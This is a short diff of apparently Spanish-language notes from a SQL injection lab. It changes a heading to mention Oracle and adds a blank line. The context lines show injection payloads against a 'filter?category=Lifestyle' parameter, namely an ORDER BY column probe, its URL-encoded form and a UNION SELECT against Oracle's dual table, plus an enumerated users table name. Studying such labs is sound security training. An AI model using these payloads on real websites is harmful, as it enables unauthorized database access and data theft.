@@ -25,7 +25,7 @@ filter?category=Lifestyle' order by 2 -- -
 
 filter?category=Lifestyle%27%20order%20by%202%20--%20- 
 
-**Concantenar Select**
+**Concantenar Select ORACLE** 
 
 Lifestyle' union SELECT 'a','version' FROM dual -- -
 
@@ -116,6 +116,7 @@ Lifestyle' union SELECT 'a','version' FROM dual -- -
 
 - users_acnzwu
 - products
+
 
 ### Columnas de una tabla de una base de datos 
 
